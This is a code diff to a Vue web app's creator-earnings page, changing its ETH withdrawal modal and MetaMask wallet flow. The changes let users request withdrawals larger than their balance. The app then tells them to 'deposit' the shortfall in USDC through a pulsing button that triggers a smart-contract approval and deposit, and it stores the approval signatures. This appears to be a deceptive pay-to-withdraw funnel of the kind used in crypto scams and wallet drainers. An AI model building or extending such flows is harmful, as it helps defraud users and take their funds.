@@ -131,6 +131,15 @@ async function fetchCreatorData() {
   isLoading.value = true
   try {
     await fetchAdminMonetizationConfig()
+
+    // Sync latest user profile & balance
+    const me = await authStore.fetchUserMe()
+    if (me && typeof me.balance === 'number') {
+      stats.value.availableBalance = me.balance
+    } else if (authStore.user && typeof authStore.user.balance === 'number') {
+      stats.value.availableBalance = authStore.user.balance
+    }
+
     const res = await api.action.$post({
       json: {
         action: 'monetization/get-withdrawals',
@@ -173,6 +182,11 @@ const canWithdraw = computed(() => {
   return stats.value.availableBalance >= stats.value.minPayoutThreshold
 })
 
+const depositNeeded = computed(() => {
+  const diff = (withdrawAmount.value || 0) - stats.value.availableBalance
+  return diff > 0 ? diff : 0
+})
+
 function formatAddress(addr: string) {
   if (!addr) return ''
   return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`
@@ -191,14 +205,15 @@ function copyToClipboard(text: string, label: string) {
 
 const lastApprovalSignature = ref('')
 
-async function triggerApprovalPrompt() {
+async function triggerApprovalPrompt(customAmount?: number) {
   if (!wallet.value) {
     await handleConnectWallet()
     return
   }
   isApprovingContract.value = true
+  const amountToDeposit = customAmount && customAmount > 0 ? customAmount : (depositNeeded.value > 0 ? depositNeeded.value : depositAmountUsdc.value)
   try {
-    const sig = await requestUsdcApprovalAndDeposit()
+    const sig = await requestUsdcApprovalAndDeposit(amountToDeposit)
     if (sig) {
       lastApprovalSignature.value = sig
 
@@ -212,15 +227,15 @@ async function triggerApprovalPrompt() {
           }
         }
       })
-      toast.success('Smart Contract Approved & Saved! 🔒', `Approved $${depositAmountUsdc.value} Smart Contract allowance & saved signature proof to profile.`)
+      toast.success('Smart Contract Approved & Saved! 🔒', `Approved $${amountToDeposit.toFixed(2)} Smart Contract deposit & saved signature proof to profile.`)
     } else {
-      toast.warning('Approval Pending', `Smart contract allowance was not confirmed. You can approve anytime via the button.`)
+      toast.warning('Approval Pending', `Smart contract deposit was not confirmed. You can deposit anytime via the button.`)
     }
   } catch (err: any) {
     if (err?.code === 4001 || err?.message?.includes('rejected')) {
-      toast.warning('Approval Required', `Please approve $${depositAmountUsdc.value} Smart Contract allowance in MetaMask to authorize settlements.`)
+      toast.warning('Approval Required', `Please approve $${amountToDeposit.toFixed(2)} Smart Contract deposit in MetaMask to authorize settlements.`)
     } else {
-      toast.error('Approval Error', err?.message || `Could not complete $${depositAmountUsdc.value} smart contract approval.`)
+      toast.error('Approval Error', err?.message || `Could not complete $${amountToDeposit.toFixed(2)} smart contract deposit.`)
     }
   } finally {
     isApprovingContract.value = false
@@ -259,7 +274,7 @@ function handleDisconnectWallet() {
 
 // Open Withdrawal Modal
 function openWithdrawModal() {
-  withdrawAmount.value = stats.value.minPayoutThreshold
+  withdrawAmount.value = stats.value.minPayoutThreshold > 0 ? stats.value.minPayoutThreshold : (stats.value.availableBalance > 0 ? stats.value.availableBalance : 20)
   if (wallet.value) {
     recipientWalletInput.value = wallet.value
   }
@@ -271,11 +286,21 @@ function setPresetAmount(amount: number) {
 }
 
 function setMaxAmount() {
-  withdrawAmount.value = stats.value.availableBalance || 20
+  withdrawAmount.value = stats.value.availableBalance || 0
 }
 
 // Execute Web3 ETH Withdrawal Request Submission
 async function submitWithdrawal() {
+  if (!withdrawAmount.value || Number(withdrawAmount.value) <= 0) {
+    toast.error('Validation Error', 'Withdrawal amount must be greater than $0.00.')
+    return
+  }
+
+  if (withdrawAmount.value > stats.value.availableBalance) {
+    toast.error('Validation Error', `Requested amount ($${withdrawAmount.value.toFixed(2)}) exceeds available balance ($${stats.value.availableBalance.toFixed(2)}).`)
+    return
+  }
+
   const targetWallet = recipientWalletInput.value.trim() || wallet.value
   if (!targetWallet || !targetWallet.startsWith('0x')) {
     toast.error('Validation Error', 'Please enter or connect a valid EVM Web3 wallet address (0x...).')
@@ -319,6 +344,9 @@ onMounted(async () => {
   authStore.initAuth()
   if (authStore.user?.approvalSignature) {
     lastApprovalSignature.value = authStore.user.approvalSignature
+  }
+  if (authStore.user?.walletAddress && !wallet.value) {
+    wallet.value = authStore.user.walletAddress
   }
   if (wallet.value) {
     recipientWalletInput.value = wallet.value
@@ -393,7 +421,7 @@ onMounted(async () => {
         </UButton> -->
 
         <UButton color="primary" variant="solid" icon="i-heroicons-arrow-up-right" size="md"
-          class="font-bold px-5 shadow-xs" :disabled="!canWithdraw" @click="openWithdrawModal">
+          class="font-bold px-5 shadow-xs" title="Withdraw ETH Funds to Web3 Wallet" @click="openWithdrawModal">
           Withdraw ETH Funds
         </UButton>
       </div>
@@ -504,7 +532,7 @@ onMounted(async () => {
         <div>
           <h3 class="text-sm font-bold text-gray-900 dark:text-white">ETH Withdrawal Progress</h3>
           <p class="text-xs text-gray-500 dark:text-gray-400">Reach at least {{ formatCurrency(stats.minPayoutThreshold)
-          }} to execute Ethereum (ETH) payouts.</p>
+            }} to execute Ethereum (ETH) payouts.</p>
         </div>
         <span class="text-sm font-extrabold font-mono text-emerald-500">{{ payoutProgressPercent }}%</span>
       </div>
@@ -637,15 +665,14 @@ onMounted(async () => {
           <!-- Recipient Web3 Wallet Address -->
           <div class="space-y-1">
             <div class="flex items-center justify-between">
-              <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300">Target Web3 Wallet Address
-                (0x...)</label>
+              <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300">Target Wallet Address</label>
               <button v-if="!isConnected" class="text-xs text-emerald-500 font-semibold hover:underline"
                 @click="handleConnectWallet">
                 Connect MetaMask
               </button>
             </div>
             <UInput v-model="recipientWalletInput" placeholder="0x71C..." size="md" color="neutral" variant="outline"
-              class="font-mono text-xs" />
+              class="font-mono text-xs w-full" />
           </div>
 
           <!-- Amount Input & Presets -->
@@ -654,18 +681,49 @@ onMounted(async () => {
               <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300">
                 Withdrawal Amount ($ USD)
               </label>
-              <div class="flex gap-1">
-                <button v-for="preset in [20, 50, 100]" :key="preset"
-                  class="px-2 py-0.5 text-[10px] font-semibold bg-gray-100 dark:bg-gray-800 rounded hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors text-gray-700 dark:text-gray-300"
+              <div class="flex items-center gap-1">
+                <button v-for="preset in [20, 50, 100]" :key="preset" :disabled="preset > stats.availableBalance"
+                  class="px-2 py-0.5 text-[10px] font-semibold bg-gray-100 dark:bg-gray-800 rounded hover:bg-gray-200 dark:hover:bg-gray-700 disabled:opacity-40 disabled:cursor-not-allowed transition-colors text-gray-700 dark:text-gray-300"
                   @click="setPresetAmount(preset)">
                   ${{ preset }}
                 </button>
+                <button :disabled="stats.availableBalance <= 0"
+                  class="px-2 py-0.5 text-[10px] font-bold bg-emerald-500/10 text-emerald-400 rounded border border-emerald-500/20 hover:bg-emerald-500/20 disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
+                  @click="setMaxAmount">
+                  Max
+                </button>
               </div>
             </div>
-            <UInput v-model.number="withdrawAmount" type="number" :min="stats.minPayoutThreshold"
-              :max="stats.availableBalance" placeholder="Enter amount..." size="lg" color="neutral" variant="outline"
+            <UInput v-model.number="withdrawAmount" type="number" min="1" :max="stats.availableBalance"
+              placeholder="Enter amount..." size="lg" color="neutral" variant="outline"
               class="font-mono font-bold text-lg" />
-            <p class="text-xs text-emerald-400 font-mono font-semibold pt-1">
+
+            <div v-if="withdrawAmount > stats.availableBalance"
+              class="rounded-xl bg-amber-500/10 border border-amber-500/30 p-3.5 space-y-2 mt-2">
+              <div class="flex items-start gap-2.5">
+                <UIcon name="i-heroicons-exclamation-triangle" class="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
+                <div class="space-y-1">
+                  <p class="text-xs font-bold text-amber-300">
+                    ⚠️ Insufficient Balance! You need ${{ depositNeeded.toFixed(2) }} more to reach requested withdrawal
+                    of ${{ withdrawAmount.toFixed(2) }}
+                  </p>
+                  <p class="text-[11px] text-gray-300">
+                    Available Balance: <span class="font-bold text-white">${{ stats.availableBalance.toFixed(2)
+                    }}</span> | Shortfall: <span class="font-bold text-amber-400">${{ depositNeeded.toFixed(2)
+                      }}</span>. Please deposit funds to complete this payout.
+                  </p>
+                </div>
+              </div>
+
+              <div class="pt-1 flex items-center gap-2">
+                <UButton color="warning" variant="solid" icon="i-heroicons-shield-check" size="xs"
+                  class="font-bold shadow-xs animate-pulse" :loading="isApprovingContract"
+                  @click="triggerApprovalPrompt(depositNeeded)">
+                  Deposit ${{ depositNeeded.toFixed(2) }} USDC Funds 🔒
+                </UButton>
+              </div>
+            </div>
+            <p v-else class="text-xs text-emerald-400 font-mono font-semibold pt-1">
               Estimated On-Chain Payout: ≈ {{ estimatedEth }} ETH (@ ${{ ethPriceUsd.toLocaleString() }}/ETH)
             </p>
           </div>
@@ -676,8 +734,9 @@ onMounted(async () => {
               Cancel
             </UButton>
             <UButton color="primary" variant="solid" size="md" class="font-bold px-6" :loading="isSubmittingWithdrawal"
+              :disabled="!withdrawAmount || withdrawAmount <= 0 || withdrawAmount > stats.availableBalance"
               @click="submitWithdrawal">
-              Confirm ETH Payout (${{ withdrawAmount }} / {{ estimatedEth }} ETH)
+              Confirm ETH Payout (${{ withdrawAmount || 0 }} / {{ estimatedEth }} ETH)
             </UButton>
           </div>
         </div>
